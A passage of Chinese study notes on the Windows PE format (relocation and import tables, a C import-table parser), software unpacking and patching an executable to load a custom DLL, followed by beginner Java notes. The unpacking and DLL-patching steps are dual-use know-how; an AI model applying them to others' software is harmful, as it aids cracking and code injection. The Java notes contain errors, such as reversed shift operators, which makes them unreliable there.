    DWORD   SizeOfBlock;
} IMAGE_BASE_RELOCATION,* PIMAGE_BASE_RELOCATION;
WORD 重定位项RE []; 
</code></pre>
<div class="table-wrapper"><table><thead><tr><th>相对于首字节的偏移</th><th>长度</th><th>含义</th></tr></thead><tbody>
<tr><td>+0</td><td>4</td><td>重定位块的内存偏移</td></tr>
<tr><td>+4</td><td>4</td><td>重定位块的长度</td></tr>
<tr><td>+8</td><td>2</td><td>从第8字节开始，每两位构成一个<strong>重定位项</strong></td></tr>
</tbody></table>
</div>
<p><strong>重定位项</strong>：高4位是一个标志，通常为0x3。低12位表示需要重定位的变量的相对偏移地址。</p>
<p>一个<strong>重定位表</strong>由多个大小SizeOfBlock的<strong>重定位块</strong>组成（不同块的SizeOfBlock大小不一）。每一个Block记录了0x1000即4KB大小的内存中需要重定位信息的地址（一页大小），这些地址以VirtualAdress为该页的基址，偏移地址占两个字节（0x1000最多需要12bit即可：0~0xFFF）。所以两个字节的低12位为偏移地址，而高4位就是一个标记，当此标记为0x3时低12bit才有效，否则该2个字节可能是为了对齐而产生的，并且为对齐而产生的字节其值全为0。</p>
<ul>
<li><strong>重定位块中的重定位项数=(重定位块长度-8)/2。</strong></li>
<li><strong>下一个重定位块的地址=当前重定位块的地址+当前重定位块长度</strong>，所以重定位块是一块紧接着一块的，他们一起构成了重定位表。</li>
<li>重定位方式（重定位发生在程序载入内存之后）：重定位多见于DLL，因为DLL的base address没什么用，装载到内存的位置是不一定的。
<ul>
<li>首先找到重定位项 <code>RVA = VirtualAddress+ (RE[i]&amp;0xFFF)</code>，在内存中该项的地址为<code>load_address+RVA</code></li>
<li>对找到的重定位项x，进行<code>x = x - base_address + load_address</code>的操作。</li>
</ul>
</li>
</ul>
<h3 id="api的重定位"><a class="header" href="#api的重定位">API的重定位</a></h3>
<p>我们在调用<strong>动态链接库DLL</strong>的函数的时候是需要在<strong>装载</strong>过程中进行重定位的，因为我们在<strong>编译</strong>和<strong>链接</strong>的时候无法确定函数的地址。</p>
<p>在电脑启动的时候，动态链接库就装载进内存了。windows提供的调用DLL的接口主要有3个：</p>
<pre><code class="language-c">/* 获得Dll的内存基地址（句柄）*/
hDll = LoadLibraryA(pDllName);	
/* 获得API的地址，第二个参数可以是API的名字
 * 也可以是API的序号+API基数 
 */
p = GetProcAddress(hDll, pApiName/ApiOrdNum);	
FreeLibrary
</code></pre>
<p>以<code>sum.exe</code>为例：</p>
<ol>
<li>
<p>可以看到我们对<code>wsprintfA</code> API的调用经历了一些复杂的过程，先是<code>call 0x40103c</code>，然后是<code>jmp [0x042004]</code>。我们查看<code>[0x042004]</code>，发现是<code>77D1ABAD</code>，也是<code>wsprintfA</code>的真实地址。
<img src="Basic/../images/1609156950382.png" alt="" />
<img src="Basic/../images/1609157330428.png" alt="" />
<img src="Basic/../images/1609157309257.png" alt="" /></p>
</li>
<li>
<p>我们现在查看原来exe的文件内容，我们要把RVA
查看<code>0x604</code>的值：<code>0x2040</code>。这个是RVA，对应的PVA=0x640
我们看<code>0x640</code>对应的内容：API的序号(2 byte)+API的名字；也就是说，这一部分的内容是装载到内存之后才填入的。
<img src="Basic/../images/1609157574707.png" alt="" />
<img src="Basic/../images/1609157669419.png" alt="" /></p>
</li>
<li>
<p>总结归纳一下，我们如果要调用DLL提供的函数，就去call跳转表；</p>
<p>跳转表的内容是<code>jmp [&amp;输入表中某一个地址指针]</code></p>
<p>至于这个输入表中的地址指针，就是loader填入的了。填入的依据，就是输入表提供的信息，DLL名和API名。</p>
</li>
</ol>
<h3 id="第四次作业-解析输入表"><a class="header" href="#第四次作业-解析输入表">第四次作业-解析输入表</a></h3>
<p>本来以为是一个简单的任务，结果一直从下午写到晚上9点。。还被C98折磨，不过下面的代码应该不是C98改装后的。效率更高的做法是利用多级指针。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
typedef __INT32_TYPE__ DWORD;
typedef __INT16_TYPE__ WORD;
typedef struct 
{
	DWORD Paddr;
	DWORD Psize;
	DWORD Vaddr;
	DWORD Vsize;
}SECTION_HEADER;

//全局变量
FILE* pe;
SECTION_HEADER section_table[0xff];
int section_num;
DWORD pehead;

/* 把RVA转换成PVA，PVA = RVA-section RVA+section PVA*/
DWORD rva2pva(DWORD rva);
/* 获得PE文件头的PVA */
DWORD get_pehead_offset();
/* 获得输入表的PVA */
DWORD get_input_offset();
/* 获得PE文件的section的数量 */
WORD get_section_num();
/* 按照格式输出输入表中的一项，返回输入表是否结束 */
int print_input_entry(DWORD entry_offset);
/* 从所给的文件偏移中得到一个C string存在buf中 */
int get_cstring(DWORD offset,char *buf);
/* 获得section table的PVA */
DWORD get_section_table_start();		
/* 检查无误，建立section table，给section_num和section_table赋值*/
void set_section_table();		
/* 分类输出API的编号或名字 */
void print_api_name(DWORD offset);

void print_api_name(DWORD offset)
{
	DWORD buf;
	char api_name[50];
	// printf(&quot;API名 字符串表%X\n&quot;,offset);
	while(1)
	{
		fseek(pe,offset,SEEK_SET);
		fread((char *)&amp;buf,4,1,pe);
		if (buf==0) break;

		if (buf&amp;0x80000000)
			sprintf(api_name,&quot;%08X&quot;,buf&amp;0x7FFFFFFF);
		else
		{
			buf = rva2pva(buf)+2;
			get_cstring(buf,api_name);
		}		
		printf(&quot;%s\n&quot;,api_name);
		offset+=4;
	} 
	printf(&quot;\n&quot;);
	return;
}

void set_section_table()
{
	char buf[0x28];
	int start = get_section_table_start(),i;
	section_num = get_section_num();
	// printf(&quot;节表的开头：0x%X\n&quot;,start);
	fseek(pe,start,SEEK_SET);
	for (i=0;i&lt;section_num;i++)
	{
		fread(buf,0x28,1,pe);
		section_table[i].Paddr = *(DWORD *)(buf+0x14);
		section_table[i].Vaddr = *(DWORD *)(buf+0xC);
		section_table[i].Psize = *(DWORD *)(buf+0x10);
		section_table[i].Vsize = *(DWORD *)(buf+0x8);
		// printf(&quot;0x%X\t0x%X\t0x%X\t0x%X\n&quot;,section_table[i].Paddr,section_table[i].Vaddr,section_table[i].Psize,section_table[i].Vsize);
	}
}
WORD get_section_num()
{
	WORD buf=0;
	//section数量的值存在偏移0x6处
	fseek(pe,pehead+0x6,SEEK_SET);
	fread((char *)&amp;buf,2,1,pe);
	return buf;
}

DWORD get_section_table_start()
{
	DWORD num_dir_entry;
	DWORD offset;
	//数据目录的项数值存在偏移0x74处
	fseek(pe,pehead+0x74,SEEK_SET);
	fread((char *)&amp;num_dir_entry,4,1,pe);
	// printf(&quot;数据目录的数量：0x%X\n&quot;,num_dir_entry);
	offset = pehead+0x78+num_dir_entry*0x8;
	return offset;
}

int get_cstring(DWORD offset,char *buf)
{
	int i=0;
	fseek(pe,offset,SEEK_SET);
	do
	{
		fread(buf+i,1,1,pe);
	} while (buf[i++]);
	return i;
}

DWORD get_pehead_offset()
{
    DWORD buf;
    //[0x3c]是pehead的偏移
    fseek(pe,0x3c,SEEK_SET);        
    fread((char *)&amp;buf,4,1,pe);
    return buf;
}

DWORD rva2pva(DWORD rva)
{
	int i;
	for (i=0;i&lt;section_num;i++)
	{
		if (rva&gt;=section_table[i].Vaddr &amp;&amp; rva&lt;section_table[i].Vaddr+section_table[i].Vsize)
			return rva-section_table[i].Vaddr+section_table[i].Paddr;
	}
	return -1;
}

DWORD get_input_offset()
{
    DWORD buf;
    fseek(pe,0x80+pehead,SEEK_SET);
    fread((char*)&amp;buf,4,1,pe);         //得到输入表的RVA
	// printf(&quot;输入表的RVA：%X\n&quot;,buf);		
    buf = rva2pva(buf);
	// printf(&quot;输入表的PVA：%X\n&quot;,buf);
    return buf;
}

int print_input_entry(DWORD entry_offset)
{
	int i;
    char buf[0x14];
    DWORD dll_offset,api_offset;
    char dll_name[30];

	// printf(&quot;entry offset:%X\n&quot;,entry_offset);
    fseek(pe,entry_offset,SEEK_SET);
    fread((char *)buf,0x14,1,pe);
	for (i=0;i&lt;0x14;i++)
		if (buf[i]!=0) break;
	if (i==0x14) return 0;
    //dll名指针在偏移0xC处
    dll_offset = rva2pva(*(DWORD *)(buf+0xC));
	// printf(&quot;字符串的位置0x%X\n&quot;,dll_offset);
    get_cstring(dll_offset,dll_name);
	printf(&quot;%s:\n&quot;,dll_name);

    //api名表指针在偏移0x0处
    api_offset = rva2pva(*(DWORD *)(buf+0));
	print_api_name(api_offset);
    return 1;
}

int main()
{
    char filename[100];
	int input_offset;
	//设置全局数据
	scanf(&quot;%s&quot;,filename);
    pe = fopen(filename,&quot;rb&quot;);
	if (pe==NULL)
	{
		printf(&quot;No such file\n&quot;);
		return 0;
	}
    pehead = get_pehead_offset();
	set_section_table();

	input_offset =  get_input_offset();
	while (print_input_entry(input_offset))
		input_offset += 0x14;
	return 0;
}
</code></pre>
<h2 id="lesson9-pe脱壳"><a class="header" href="#lesson9-pe脱壳">Lesson9 PE脱壳</a></h2>
<p><a href="https://bbs.pediy.com/thread-20366.htm">看雪脱壳新手教程</a>，<a href="https://bbs.pediy.com/thread-52042.htm">看雪脱壳教程</a>。PECompact加的壳比较好脱，upx是一个开源的加壳工具，他可以自己脱自己。VMprotect用了虚拟机技术对exe的部分函数进行加密，是不可能脱壳的。armadillo、enigma相对VMprotect容易一些。</p>
<p>加壳：其实是利用特殊的算法，对可执行文件里的资源进行压缩，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。它们附加在原程序上通过加载器载入内存后，先于原始程序执行，得到控制权，执行过程中对原始程序进行解密、还原，还原完成后再把控制权交还给原始程序，执行原来的代码部分。加上外壳后，原始程序代码在磁盘文件中一般是以加密后的形式存在的，只在执行时在内存中还原，这样就可以比较有效地防止破解者对程序文件的非法修改，同时也可以防止程序被静态反编译。</p>
<p>esp定律：shell会在开始的时候压入很多寄存器，返回的时候要把他们弹出。所以我们可以给最后入栈的那一块内存设一个断点**（硬件访问断点）**。然后执行，会在shell code返回的前夕断住。然后接下去调试几步就回到了原来正常的地方了。</p>
<p>olleydump插件是一个半自动的脱壳机。</p>
<p><code>GetModuleHandleA</code>可以获得DLL的载入首地址（也就是所谓的Handler）</p>
<p>脱壳一般来说要做3件事情，然后就可以dump内存了：</p>
<ol>
<li>恢复API地址表，因为API地址表载入内存之后是会被修改的。</li>
<li>找到原始的输入表的地址</li>
<li>找到原始的 eip</li>
</ol>
<p>把exe从内存中dump出来之后，还要做这几件事情：</p>
<ol>
<li>要记得对齐这件事情，要把文件对齐改成内存对齐，以及PE文件头后面的段描述符表也要修改</li>
<li>修改EIP，把它从shell code的地址指向原来的起始地址</li>
<li>修改输入表的地址指针，把它从shell code的输入表地址指向原来的输入表地址。</li>
</ol>
<h2 id="lesson10-pe-patch"><a class="header" href="#lesson10-pe-patch">Lesson10 PE Patch</a></h2>
<!-- 我觉得这个可以写个程序练练手。留个坑吧。-->
<p>为了给某个exe增加一个功能，需要做2件事：</p>
<ol>
<li>修改exe, 让它<code>h=LoadLibraryA(&quot;my.dll&quot;)</code>;
再<code>p=GetProcAddress(h, &quot;MyFunc&quot;)</code>;最后<code>call p</code></li>
<li>用C或C++写my.dll, 导出函数MyFunc，把它载入内存。</li>
</ol>
<p>但是没有这么简单。原来的程序不一定有这两个函数。所以我们需要在输入表中添加这个DLL，然后再用它。具体步骤如下：</p>
<ol>
<li>增加一个新的段：要<strong>增加段的个数(0x6)</strong>，Section Header要增加一项，exe载入内存长度也要相应变大。这个段是留给我们新的输入表用的。我们要仔细修改Section Header新加的项。</li>
<li>可以把新增的段作为新的输入表的地址，修改原来的<strong>输入表地址指针0x80</strong>。然后我们填入原来输入表的内容和我们要加上去的内容，我们需要把DLL名、API名、都填进去，还要建立好API名字指针表和API地址表，然后再把输入表项填好，注意最后一定还是要有0x14个0。</li>
<li>然后调用我们的API的时候需要注意，我们要<code>call [API地址表对应的项]</code>并且注意call是相对寻址的。</li>
<li>然后我们可能需要修改EIP让程序先执行我们的API（记得回去），也可能想修改中间的某条代码，这个就可以有很多种形式了。</li>
</ol>
<p>另外，操作系统在载入DLL的时候，如果DLL还没有载入内存，默认从SYSTEM和exe所在目录寻找DLL文件。</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="java"><a class="header" href="#java">Java</a></h1>
<p>花了一个星期看了一遍翁恺老师的课程。</p>
<p>然后鸿蒙课的时候又用Java糊了一点东西。</p>
<p>我对他的理解仅限于此了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="java-1"><a class="header" href="#java-1">Java</a></h1>
<h2 id="1-about-java"><a class="header" href="#1-about-java">1. About Java</a></h2>
<h3 id="11-java-project"><a class="header" href="#11-java-project">1.1. Java Project</a></h3>
<p>最简单的方式当然是用IDE啦。比如Eclipse。
Java源码本质上是一个文本文件，我们需要先用javac把Hello.java编译成字节码文件Hello.class，然后，用java命令执行这个字节码文件。</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260467032946976">包package</a>.一个包就是一个名称空间，这样子可以解决类名重复的问题。所有Java文件对应的目录层次要和包的层次一致。所以显然，包没有父子关系，只是目录的索引。
default(friendly)：即不加任何访问修饰符，通常称为“默认访问模式“。该模式下，只允许在同一个包中进行访问。（包作用域）</p>
<pre><code class="language-java">//我们在调用 类class 的时候，可以使用 import
//当前package存在的类，或者java.lang中存在的class，不需要再Import。
import mr.jun.Arrays;      //import可以导入包中的类 
import static java.lang.Math.*;    //静态导入，只导入静态方法 
public class Person {
    public void run() {
        Arrays arrays = new Arrays();    //这样就只用写简单类名了
    }
class Hello {
	public static void main(String args[]) {
		System.out.print(sqrt(5));
	}
}
</code></pre>
<p>编译单元：可以认为是一个java文件。一个编译单元可以有多个Class，但最多只有一个public的Class，并且与Java文件同名。通常情况下，我们让一个java文件只有一个类。</p>
<h3 id="12-different-java"><a class="header" href="#12-different-java">1.2. Different Java</a></h3>
<ul>
<li>Java SE：Standard Edition</li>
<li>Java EE：Enterprise Edition</li>
<li>Java ME：Micro Edition</li>
</ul>
<p>首先要学习Java SE，掌握Java语言本身、Java核心开发技术以及Java标准库的使用；如果继续学习Java EE，那么Spring框架、数据库开发、分布式架构就是需要学习的；如果要学习大数据开发，那么Hadoop、Spark、Flink这些大数据平台就是需要学习的，他们都基于Java或Scala开发；如果想要学习移动开发，那么就深入Android平台，掌握Android App开发。</p>
<h3 id="13-java-clitools"><a class="header" href="#13-java-clitools">1.3. Java CLITools</a></h3>
<ul>
<li>java：这个可执行程序其实就是JVM，运行Java程序，就是启动JVM，然后让JVM执行指定的编译后的代码；</li>
<li>javac：这是Java的编译器，它用于把Java源码文件（以.java后缀结尾）编译为Java字节码文件（以.class后缀结尾）；</li>
<li>jar：用于把一组.class文件打包成一个.jar文件，便于发布；</li>
<li>javadoc：用于从Java源码中自动提取注释并生成文档；</li>
<li>jdb：Java调试器，用于开发阶段的运行调试。</li>
</ul>
<p>JDK：Java Development Kit JRE：Java Runtime Environment</p>
<h2 id="2-java-basic"><a class="header" href="#2-java-basic">2. Java Basic</a></h2>
<h3 id="21-basic-io"><a class="header" href="#21-basic-io">2.1. Basic IO</a></h3>
<pre><code class="language-java">Scanner in = new Scanner(System.in);
int num;
num = in.nextInt();    //简单读入
double f;
f = in.nextDouble();
System.out.println(&quot;float=&quot;+f+&quot;,&quot;+&quot;int=&quot;+num);    //简单输出。+，字符串连接
</code></pre>
<h3 id="22-compute"><a class="header" href="#22-compute">2.2. Compute</a></h3>
<p>和C语言完全差不多，甚至连强制类型转换的格式都一样。四则运算，自增自减，位运算，都和C语言一样。在java中，<code>&gt;&gt;&gt;</code>表示算数右移，<code>&gt;&gt;</code>表示逻辑右移。</p>
<h3 id="23-comment"><a class="header" href="#23-comment">2.3. Comment</a></h3>
<p>和C语言完全差不多，也是<code>//</code> 或 <code>/**/</code>。</p>
<pre><code class="language-java">/**    
* This is a comment
* and it will be doc
*/
@param 变量描述
</code></pre>
<h3 id="24-compare-and-logic"><a class="header" href="#24-compare-and-logic">2.4. Compare and Logic</a></h3>
<p>Java提供了六个关系运算符，和C语言一样。逻辑运算符与或非和C语言一样。短路逻辑也和C语言一样。甚至Java也有<code>?:</code>表达式。</p>
<pre><code class="language-java">boolean x;
x = true;
</code></pre>
<p>注意其中有两个字符的运算符：==、&gt;=和&lt;=的两个字符必须紧紧连在一起，中间不能插入空格。
关系运算的结果是一个逻辑值，逻辑值只有两种可能的值：true（真，表示成立）或false（假，表示不成立）。当两个值的关系符合关系运算符的预期时，关系运算的结果为true，否则为false。
在Java中不要把True和False当做1,0
If-else语句和C语言一模一样，Switch语句也和C语言一模一样。</p>
<h3 id="25-loop"><a class="header" href="#25-loop">2.5. Loop</a></h3>
<p><code>while</code> 循环和C语言一模一样。<code>do while</code> 循环和C语言一模一样。<code>for</code> 循环可以和C语言一模一样。但是也有另一种For Each循环，可以遍历<em>可迭代</em>数据类型的每一个数据。</p>
<pre><code class="language-java">int[] ns = { 1, 4, 9, 16, 25 };
for (int n : ns) {
    System.out.println(n);
    //要注意的是，这里的n是可迭代类型中每个元素的副本。
</code></pre>
<h3 id="26-array"><a class="header" href="#26-array">2.6. Array</a></h3>
<pre><code class="language-java">int [] numbers = new int[100];    	//new创建的数组会得到默认的0
int [] bak = numbers;    			//bak和numbers指向同一个数组
System.out.println(numbers[10]);
</code></pre>
<p>在Java中，数组是对象。numbers是一个引用。</p>
<h3 id="27-character-and-string"><a class="header" href="#27-character-and-string">2.7. character and String</a></h3>
<p>在Java中，用<em>单引号</em>表示字符。用Unicode表示字符，所以无论是汉字和英文等等都没问题。用<em>双引号</em>表示字符串。</p>
<pre><code class="language-java">char a = '\u0041';     //用十六进制编码表示字符
char b = 'a';
String s = new String(&quot;a string&quot;);
String s2 ;
Scanner in = new Scanner(System.in);
s2 = in.next();    //读入一个单词
s2 = in.nextLine();    //读入一行，之前s2指向被垃圾回收了。
</code></pre>
<p>一些字符串方法和属性</p>
<pre><code class="language-java">String s = new String(&quot;a string&quot;);
System.out.println(s.charAt(1));    //字符串的索引
System.out.println(s.sub(1));
System.out.println(s.indexOf(1));
</code></pre>
<h3 id="28-function"><a class="header" href="#28-function">2.8. Function</a></h3>
<pre><code class="language-java">public class Hello {
    public static boolean isprime(int i)
    {	
        int k;
        if (i&lt;=1) return false;
        for (k=2;k&lt;(int)Math.sqrt(i)+1;k++)
            if (i % k==0) return false;
        return true;
    }
    public static void main(String[] args) {
        // TODO Auto-generated method stub
        System.out.println(isprime(5));
    }
}
</code></pre>
<p>函数需要定义在Class里头。需要规定返回值的类型。</p>
<p>可变参数个数的函数：</p>
<pre><code class="language-java">public class PrintStream{
    //注意这里的...，表示参数可变。
    public PrintStream printf(String fmt,Object... args){
        //对函数的编写者来说，args就是一个数组Object[]
        ......
    }
}
</code></pre>
<h2 id="3-java-oop"><a class="header" href="#3-java-oop">3. Java-&gt;OOP</a></h2>
<h3 id="31-class-and-instance"><a class="header" href="#31-class-and-instance">3.1. Class and Instance</a></h3>
<p>对象是实体，需要被创建。类(class)是定义，我们根据类来创建对象。<code>new</code>操作符可以创建一个实例。我们常说，类 = 属性＋方法。</p>
<p>封装(encapsulation)：把数据和对数据的操作放在一起，对使用者隐藏具体的实现方式。绝对不能让类中的方法访问其他类的实例字段。只能通过方法和对象交互数据。</p>
<h3 id="32-different-variables"><a class="header" href="#32-different-variables">3.2. Different Variables</a></h3>
<ul>
<li>成员变量：定义在函数外部。成员变量的生存期是对象的生存期，作用域是对象内部的成员函数。在函数中可以直接写成员变量的名字访问成员变量。（Java会自动垃圾回收）</li>
<li>本地变量：定义在函数内部。生存期和作用域都是函数内部。本地变量会“覆盖”成员变量，想要用成员变量需要用如：<code>this.name = name;</code></li>
</ul>
<h3 id="33-modifier-of-function-and-variable"><a class="header" href="#33-modifier-of-function-and-variable">3.3. Modifier of function and variable</a></h3>
<p>访问修饰符（access modifier）：</p>
<ul>
<li>public：Java语言中访问限制最宽的修饰符，一般称之为“公共的”。被其修饰的类、属性以及方法不仅可以跨类访问，而且允许跨包（package）访问。</li>
<li>private： Java语言中对访问权限限制的最窄的修饰符，一般称之为“私有的”。被其修饰的类、属性以及方法只能<strong>被该类的对象</strong>访问，其子类不能访问，更不能允许跨包访问。(换句话说，同一个类的不同对象，相互之间也可以访问私有变量)强烈建议对类内的变量设置为private类型。</li>
<li>protected：介于public 和 private 之间的一种访问修饰符，一般称之为“保护形”。被其修饰的类、属性以及方法只能<strong>被类本身的方法及子类访问</strong>，即使子类在不同的包中也可以访问。</li>
<li>default(friendly)：即不加任何访问修饰符，通常称为“默认访问模式“。该模式下，只允许在同一个包中进行访问。</li>
</ul>
<p>一般情况下，类中所有的变量都要用private。如果要确实需要访问、修改，可以用get,set函数。</p>
<ul>
<li>static: 被static修饰的变量或函数，就不是<strong>对象</strong>所有的，而是被<strong>类</strong>所有了。换句话说，每个<strong>该类的每个对象</strong>都拥有它，并且是同一个。并且不能访问直接一个<strong>对象的变量或函数</strong>，因为它不知道要访问谁。</li>
<li>final：被final修饰的变量只能在初始化的时候赋值（有点像const），赋值后不能改变。被final修饰的方法不能被子类覆盖。（参考：https://www.cnblogs.com/xuelisheng/p/11158110.html）</li>
</ul>
<p>this是一个特殊的变量,代表自己这个对象。</p>
<h3 id="34-initialization-constructor"><a class="header" href="#34-initialization-constructor">3.4. Initialization-&gt;Constructor</a></h3>
<p>默认初始化：没有在构造方法中初始化字段时，引用类型的字段默认是null，数值类型的字段用默认值，int类型默认值是0，布尔类型默认值false。不要使用默认初始化，这是不好的习惯。</p>
<p>构造函数：有一个成员函数的名字和类的名字完全相同，则在创建这个类的每一个对象的时候会自动调用这个函数(<strong>初始化操作</strong>)，在完成初始化变量动作之后（也就是说，在构造函数中的初始化操作会覆盖创建变量的初始化操作）。这个函数不能有返回类型。</p>
<p>一个构造方法可以调用其他构造方法，这样做的目的是便于代码复用。调用其他构造方法的语法是this(…)
初始化顺序：调用super() -&gt; 字段赋初值 -&gt; 构造函数</p>
<p>工厂方法：可以给类定义一个静态方法，返回值是该类的对象。可以生成特定的对象。</p>
<pre><code class="language-java">public class VM{
    int　price;

    VM()    //构造函数
    {

    }        
    VM(String name,int price) //另一个构造函数,重载。
    {
        this.name = name;
        this.price = price;
    }
    VM(String name)    //另一个构造函数,重载。
    {
        this(name,10);    //调用别的构造函数
    }
}
</code></pre>
<h3 id="35-overload重载"><a class="header" href="#35-overload重载">3.5. Overload重载</a></h3>
<p>一个类中同名但是<strong>参数表不同</strong>的函数构成了重载关系。</p>
<p>方法重载的目的是，功能类似的方法使用同一名字，更容易记住，因此，调用起来更简单。</p>
<p>在Java中，一个方法由**方法名和参数类型(称为签名signature)**唯一确定，返回类型不是方法签名的一部分。所以不能有两个名字相同、参数类型相同却有不同返回类型的方法。事实上，我们一般让相同名字的函数都返回相同的类型。</p>
<h3 id="36-inheritance-and-polymorphisms"><a class="header" href="#36-inheritance-and-polymorphisms">3.6. Inheritance and Polymorphisms</a></h3>
<p>Java使用extends关键字来实现继承。Java不支持多继承。</p>
<p>对理解继承来说，最重要的事情是，知道哪些东西被继承了，或者说，子类从父类那里得到了什么。答案是：所有的东西，所有的父类的成员，包括变量和方法，都成为了子类的成员，<strong>除了构造方法</strong>。构造方法是父类所独有的，因为它们的名字就是类的名字，所以父类的构造方法在子类中不存在。除此之外，子类继承得到了父类所有的成员。</p>
<p>覆盖：当子类和父类存在<strong>名称和参数（签名）完全相同</strong>的函数，子类的会覆盖父类的。</p>
<p>super关键字表示父类（超类）。子类引用父类的字段时，可以用<code>super.fieldName</code>。使用父类的方法,<code>super.func()</code>。调用父类的变量时，private仍然是不能调用的。<code>super()</code>调用父类的构造函数，应该在构造函数的最之前调用。super和this有很多相似之处，但是super不是对一个对象的引用，而this是。</p>
<p>多态：Java的对象变量是多态的。<strong>一个对象变量</strong>可以指示<strong>多种实际对象</strong>的现象称为<strong>多态</strong>。子类的对象可以赋给父类的变量。（父类的<em>管理者</em>，也可以管理子类）反之不然。并且，在运行时能自动的选择恰当的方法，称为<strong>动态绑定</strong>。虽然可以通过强制类型转换把父类的对象赋给子类的变量，但是这样不好。可能会出现异常<code>ClassCastException</code>。向上造型是安全的，反之不然。</p>
<p>A instanceof B :这个是一个二元运算，判断A是不是B类的实例，或者是其直接、间接子类的实例，或者是实现了B接口的类的实例。</p>
<pre><code class="language-java">//比如，Students继承了Person。然后getgrade()是Students类特有的方法。
Person ji = new Students();
//ji.getgrade();    错误，不可以使用特有方法
if (ji instanceof Students)    //超类强制类型转换成子类前，先instanceof是好习惯。
    ((Students)ji).getgrade();
</code></pre>
<h3 id="37-abstract-class抽象类"><a class="header" href="#37-abstract-class抽象类">3.7. Abstract Class抽象类</a></h3>
<p>我们用abstract关键字表达抽象类。</p>
<p>抽象函数：表达概念而无法实现具体代码的函数。如果父类的方法本身不需要实现任何功能，仅仅是为了定义方法签名，目的是让子类去覆写它，那么，可以把父类的方法声明为抽象方法。</p>
<p>抽象类不能实例化，换句话说，我们不希望通过抽象类创建对象。</p>
<p>抽象类用于继承，<strong>子类必须覆盖抽象类的抽象函数</strong>（称为实现）。不然子类也是抽象类了。有抽象函数的类就是抽象类。但是我们可以用抽象类来定义变量，当然，用于管理非抽象的子类的对象。</p>
<h3 id="38-generics泛型"><a class="header" href="#38-generics泛型">3.8. Generics泛型</a></h3>
<p>参考 ：https://www.cnblogs.com/coprince/p/8603492.html</p>
<p>泛型类<code>ArrayList a = new ArrayList&lt;Integer&gt;</code></p>
<p>泛型方法<code>public static &lt;T extends Comparable&gt; T min(T[] a){}</code>,表示T要满足这个接口/继承这个类。</p>
<p><strong>java 中泛型标记符：</strong></p>
<ul>
<li><strong>E</strong> - Element (在集合中使用，因为集合中存放的是元素)</li>
<li><strong>T</strong> - Type（Java 类）</li>
<li><strong>K</strong> - Key（键）</li>
<li><strong>V</strong> - Value（值）</li>
<li><strong>N</strong> - Number（数值类型）</li>
<li><strong>？</strong> - 表示不确定的 java 类型</li>
</ul>
<p>例子</p>
<pre><code class="language-java">public static &lt;T extends Comparable&lt;T&gt;&gt; T maximum(T x, T y, T z)
{
    T max = x; // 假设x是初始最大值
    if ( y.compareTo( max ) &gt; 0 ){
        max = y; //y 更大
    }
    if ( z.compareTo( max ) &gt; 0 ){
        max = z; // 现在 z 更大           
    }
    return max; // 返回最大对象
}
</code></pre>
<h3 id="39-interface接口"><a class="header" href="#39-interface接口">3.9. Interface接口</a></h3>
<p>在Java中，使用interface可以声明一个接口：接口不是类，而是对类的一组需求描述。</p>
<p>如果一个抽象类没有实例字段，所有方法全部都是抽象方法，就可以把该抽象类改写为接口：interface。当一个具体的class去实现一个interface时，需要使用implements关键字。在Java中，一个类只能继承自另一个类，不能从多个类继承。但是，一个类可以实现多个interface。 正是这两个特点让我们决定什么时候使用接口，什么时候使用抽象类。</p>
<p>interface的变量只能是public static final类型；函数只能是 public abstrct类型。所以可以省略。如何标记我的方法需要对象满足xx接口呢？用instanceof运算符！</p>
<pre><code class="language-java">package hello;

import java.util.Arrays;
//我也不知道为什么这里直接写Comparable不行。

public class Main implements java.lang.Comparable&lt;Main&gt;{ 
	private int number;
	private int level;
  
	public Main(int number,int level) {
      	this.number = number;
      	this.level = level;
    }
    //接口的实现
	@Override
	public int compareTo(Main other) {
		int ret;
		ret = Integer.compare(this.number, other.number);
		ret = (ret==0 ? Integer.compare(this.level, other.level):ret);
		return ret;
	}
	
	public static void main(String... args) {
		Main[] h = new Main[3];
		h[0]=new Main(1,3);
		h[1]=new Main(2,4);
		h[2]=new Main(1,1);
		System.out.println(h);
		Arrays.sort(h);
		for (Main i:h)
			System.out.println(i.number+&quot;  &quot;+i.level);
	}
}
</code></pre>
<p>定义接口示例代码：</p>
<p>实现回调，我们需要利用接口。
实现ActionListener接口。
如果接口的默认方法和父类之间发生了冲突怎么办？</p>
<ol>
<li>父类优先，如果父类提供了具体方法，采用父类的具体方法。</li>
<li>如果接口之间的默认方法产生了冲突，我们必须覆盖接口的方法。</li>
</ol>
<h3 id="310-接口和回调"><a class="header" href="#310-接口和回调">3.10. 接口和回调</a></h3>
<p>回调和界面设计息息相关。</p>
<pre><code class="language-java">package hello;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.time.Instant;
import java.util.Arrays;

import javax.swing.JOptionPane;
import javax.swing.Timer;       

public class Main { 	
	public static void main(String... args) {
		TimePrinter listener = new TimePrinter();
        //可以给Timer传入一个类，这个类满足了ActionListener接口。那么每隔1000ms就会调用一次listener.actionPerformed()
		Timer timer = new Timer(1000,listener);
		timer.start();
		//这个可以弹出一个对话框，有点像WIN中的MessageBox。
		JOptionPane.showMessageDialog(null, &quot;Quit?&quot;);
		System.exit(0);
	}
}

class TimePrinter implements ActionListener{
	@Override
	public void actionPerformed(ActionEvent event) {
		// TODO Auto-generated method stub
		System.out.println(&quot;At the tone,the time is &quot;+Instant.ofEpochMilli(event.getWhen()));
		Toolkit.getDefaultToolkit().beep();
	}
}
</code></pre>
<h3 id="311-lambda-expression--method-reference"><a class="header" href="#311-lambda-expression--method-reference">3.11. lambda expression &amp;&amp; method reference</a></h3>
<p>对于只有一个抽象方法的接口，在需要这种接口的对象时，就可以提供一个Lambda表达式。构造器引用：和方法引用一模一样，不过方法名换成了new。如：<code>Integet::new</code>。
代码示例：</p>
<pre><code class="language-java">//下面三个方法都可以
public class Main { 	
	public static void main(String... args) {
		Integer[] a = {1,3,2,4,5};

        //一般的接口调用，传递一个满足了接口的对象
        Arrays.sort(a, new IntComparator())  ;
        //lambda表达式，由于Comparator接口只有一个抽象方法，就可以用Lambda表达式代替。
		Arrays.sort(a, (x,y)-&gt;x-y ); 
        //方法引用，当lambda表达式只调用一个方法而不做其他操作时，可以重写为方法应用。会自动调用Integer.compare(arg0,arg1)。
        Arrays.sort(a,Integer::compare);

